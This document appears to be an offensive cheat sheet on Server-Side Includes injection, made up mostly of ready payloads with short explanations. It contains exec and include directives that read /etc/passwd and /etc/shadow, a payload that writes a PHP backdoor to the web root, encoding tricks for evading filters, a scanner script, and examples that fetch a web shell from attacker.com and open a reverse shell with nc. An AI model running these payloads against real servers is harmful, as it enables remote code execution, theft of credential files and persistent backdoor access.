### üõ°Ô∏è Server-Side Includes (SSI) Injection

**Server-Side Includes (SSI) Injection** is a web vulnerability that allows attackers to inject malicious scripts into web pages that are processed by the server before being sent to clients. SSI directives are embedded in HTML comments and executed on the server, enabling remote code execution when user input is not properly sanitized.

  * **Injection Point:** User input that gets reflected in pages processed by SSI-enabled servers.
  * **Impact:** Remote code execution, file disclosure, system command execution.
  * **Common Targets:** Applications with dynamic content generation, comment systems, user input reflection.
  * **Root Cause:** Lack of input sanitization in SSI-enabled environments.

-----

### üìù Basic SSI Injection Payloads

Understanding SSI directives and their basic usage for exploitation.

  * **Understanding SSI Directives**

    ```html
    <!--#directive attribute="value"-->
    ```

    **Why it's used:** To test if the server processes SSI directives.
    **How it works:** SSI uses special HTML comments that are processed by the server before serving the page. If the server is configured to parse SSI, these directives will be executed.

  * **Basic Command Execution**

    ```html
    <!--#exec cmd="ls -la"-->
    ```

    **Why it's used:** To execute system commands on the server with web server privileges.
    **How it works:** The `exec` directive runs operating system commands. The output is embedded in the HTML response.

  * **File Inclusion**

    ```html
    <!--#include virtual="/etc/passwd"-->
    ```

    **Why it's used:** To read local files from the server's filesystem.
    **How it works:** The `include` directive inserts the content of the specified file into the HTML response.

  * **Environment Variable Disclosure**

    ```html
    <!--#echo var="DOCUMENT_ROOT"-->
    ```

    **Why it's used:** To gather server configuration and environment information.
    **How it works:** The `echo` directive outputs the value of server environment variables.

-----

### üñºÔ∏è SSI Injection in Different Contexts

SSI injection can occur in various HTML contexts where user input is reflected.

  * **HTML Context Injection**

    ```html
    <div>User input: <!--#exec cmd="whoami"--></div>
    ```

    **Why it's used:** When user input is reflected directly within HTML elements.
    **How it works:** The server processes the SSI directive embedded in the user-controlled content before sending the response.

  * **Attribute Context Injection**

    ```html
    <img src="<!--#exec cmd="whoami"-->" alt="test">
    ```

    **Why it's used:** When input is reflected within HTML attributes.
    **How it works:** The SSI directive executes within the attribute context, potentially breaking the attribute or executing commands.

  * **Comment Context Injection**

    ```html
    <!-- User comment: <!--#exec cmd="id"--> -->
    ```

    **Why it's used:** When user input is placed inside HTML comments.
    **How it works:** The server processes nested SSI directives even within comment blocks.

-----

### ü§´ Advanced SSI Injection Techniques

Advanced techniques for complex exploitation scenarios.

  * **Conditional Execution**

    ```html
    <!--#if expr="$REMOTE_ADDR = /192.168.1.*/" -->
        <!--#include virtual="/admin/secret.html" -->
    <!--#endif-->
    ```

    **Why it's used:** For targeted exploitation based on server variables.
    **How it works:** SSI conditionals allow execution only when specific conditions are met.

  * **Multiple Command Execution**

    ```html
    <!--#exec cmd="ls -la; whoami; id"-->
    ```

    **Why it's used:** To execute multiple commands in a single directive.
    **How it works:** Command chaining allows multiple system commands to run sequentially.

  * **File Manipulation**

    ```html
    <!--#exec cmd="echo '<?php system(\$_GET[\"c\"]); ?>' > /var/www/html/backdoor.php"-->
    ```

    **Why it's used:** To create backdoor files for persistent access.
    **How it works:** The `exec` directive writes malicious content to a web-accessible directory.

  * **Setting Environment Variables**

    ```html
    <!--#set var="name" value="attacker"-->
    <!--#echo var="name"-->
    ```

    **Why it's used:** To manipulate server variables for reconnaissance or exploitation.
    **How it works:** The `set` directive creates or modifies environment variables.

-----

### üåÄ Obfuscation and Bypass Techniques

Techniques to evade basic SSI filtering mechanisms.

  * **URL Encoding**

    ```html
    <!--%23exec%20cmd%3d%22whoami%22-->
    ```

    **Why it's used:** When basic SSI directives are blocked by WAFs or filters.
    **How it works:** URL decoding happens before SSI processing, allowing encoded payloads to bypass filters.

  * **Case Variation**

    ```html
    <!--#EXEC cmd="whoami"-->
    <!--#Exec CMD="whoami"-->
    ```

    **Why it's used:** To bypass case-sensitive filters.
    **How it works:** SSI processing is often case-insensitive for directive names.

  * **Whitespace Manipulation**

    ```html
    <!--#exec   cmd="whoami"-->
    <!--#exec
    cmd="whoami"
    -->
    ```

    **Why it's used:** When whitespace filters are implemented.
    **How it works:** SSI parsers typically ignore extra whitespace.

  * **Mixed Encoding**

    ```html
    <!--#%65xec cmd="whoami"-->
    <!--#inc%6cude virtual="/etc/passwd"-->
    ```

    **Why it's used:** To evade pattern-based detection.
    **How it works:** Partial character encoding can bypass simple regex patterns.

-----

### üïµÔ∏è‚Äç‚ôÄÔ∏è Detection and Testing Methods

Manual and automated approaches to detect SSI injection vulnerabilities.

  * **Manual Testing Approach**

    1. Identify reflection points in the application
    2. Test basic SSI directives
    3. Try different encoding methods
    4. Test conditional execution
    5. Verify command execution results

  * **Basic Detection Payloads**

    ```html
    <!--#echo var="DOCUMENT_ROOT"-->
    <!--#exec cmd="echo SSI_TEST_SUCCESS"-->
    <!--#include virtual="/etc/hosts"-->
    <!--#config timefmt="%A"-->
    ```

  * **Automated Detection with Burp Suite**

    ```http
    POST /search HTTP/1.1
    Host: target.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 45

    query=<!--#exec%20cmd="echo%20SSI_VULNERABLE"-->
    ```

    **Why it's used:** For automated scanning of SSI injection vulnerabilities.
    **How it works:** Burp Suite sends crafted SSI payloads and checks for successful execution indicators.

  * **Nuclei Templates**

    ```yaml
    id: ssi-injection-detection

    info:
      name: SSI Injection Detection
      author: security-researcher
      severity: high
      description: Detects Server-Side Includes injection vulnerabilities

    requests:
      - method: POST
        path:
          - "{{BaseURL}}/search"
          - "{{BaseURL}}/comment"
          - "{{BaseURL}}/profile"
        
        body: "input=<!--#echo var=\"DOCUMENT_ROOT\"-->"
        matchers:
          - type: word
            words:
              - "/var/www"
              - "/home"
              - "htdocs"
              - "www"
            part: body

      - method: POST
        path:
          - "{{BaseURL}}/search"
        
        body: "input=<!--#exec cmd=\"echo SSI_NUCLEI_TEST\"-->"
        matchers:
          - type: word
            words:
              - "SSI_NUCLEI_TEST"
            part: body
    ```

  * **Custom Python Scanner**

    ```python
    import requests
    import urllib.parse

    def test_ssi_injection(target_url, payloads):
        vulnerabilities = []
        
        for payload in payloads:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            
            data = {'input': payload}
            response = requests.post(target_url, data=data)
            
            # Check for successful execution indicators
            indicators = [
                "root:",
                "var/www",
                "SSI_TEST_SUCCESS",
                "DOCUMENT_ROOT",
                "Apache",
                "nginx"
            ]
            
            for indicator in indicators:
                if indicator in response.text:
                    print(f"[+] SSI Injection vulnerable with: {payload}")
                    vulnerabilities.append(payload)
                    break
                    
        return vulnerabilities

    # Common SSI injection payloads
    payloads = [
        '<!--#exec cmd="cat /etc/passwd"-->',
        '<!--#include virtual="/etc/passwd"-->',
        '<!--#echo var="DOCUMENT_ROOT"-->',
        '<!--#exec cmd="echo SSI_TEST_SUCCESS"-->',
        '<!--#config timefmt="%A"-->',
        '<!--#set var="test" value="SSI_WORKS"-->',
        '<!--#echo var="test"-->'
    ]

    target_url = "http://target.com/search"
    results = test_ssi_injection(target_url, payloads)
    
    if results:
        print(f"[!] Found {len(results)} vulnerable payloads")
    else:
        print("[-] No SSI injection vulnerabilities detected")
    ```

-----

### üìÅ SSI in SHTML Files

Understanding SSI implementation in `.shtml` files and special considerations.

  * **Basic SHTML File Structure**

    ```html
    <!--#echo var="LAST_MODIFIED" -->
    <html>
    <head>
        <title>SSI Test Page</title>
    </head>
    <body>
        <h1>Server Information</h1>
        <p>Document Root: <!--#echo var="DOCUMENT_ROOT" --></p>
        <p>Server Name: <!--#echo var="SERVER_NAME" --></p>
        <p>User Agent: <!--#echo var="HTTP_USER_AGENT" --></p>
        
        <h2>File Contents</h2>
        <!--#include virtual="/includes/header.html" -->
        
        <h2>Current Directory Listing</h2>
        <!--#exec cmd="ls -la" -->
    </body>
    </html>
    ```

    **Why it's used:** `.shtml` files are specifically designed for SSI processing.
    **How it works:** Servers configured for SSI automatically process directives in files with `.shtml` extension.

  * **Advanced SHTML Exploitation**

    ```html
    <!--#config errmsg="[SSI Error]" -->
    <!--#config sizefmt="bytes" -->
    <!--#config timefmt="%Y-%m-%d" -->
    
    <!--#if expr="$QUERY_STRING = /debug/" -->
        <!--#exec cmd="cat /etc/passwd" -->
    <!--#endif -->
    
    <!--#set var="cmd" value="$QUERY_STRING_CMD" -->
    <!--#if expr="$cmd" -->
        <!--#exec cmd="$cmd" -->
    <!--#endif -->
    ```

    **Why it's used:** For sophisticated exploitation scenarios.
    **How it works:** Multiple SSI directives work together to create complex exploitation logic.

-----

### üîç Real-World Exploitation Scenarios

Practical examples of SSI injection in different contexts.

  * **Blog Comment System**

    ```html
    <!-- Normal comment -->
    Great article! Thanks for sharing.
    
    <!-- Malicious SSI comment -->
    Nice post! <!--#exec cmd="wget http://attacker.com/shell.txt -O /var/www/html/shell.php"-->
    ```

  * **User Profile Page**

    ```html
    <!-- Bio field exploitation -->
    <div class="bio">
        Security researcher <!--#exec cmd="cat /etc/passwd"-->
    </div>
    ```

  * **Search Functionality**

    ```html
    <!-- Search results page -->
    <p>Results for: <!--#include virtual="/etc/shadow"--></p>
    ```

  * **File Upload with SSI**

    ```html
    <!-- Malicious uploaded file with .shtml extension -->
    <!--#exec cmd="nc -e /bin/bash attacker.com 4444"-->
    <html>
    <body>
        Welcome to my page!
    </body>
    </html>
    ```

-----

**Made with love by VIsh0k**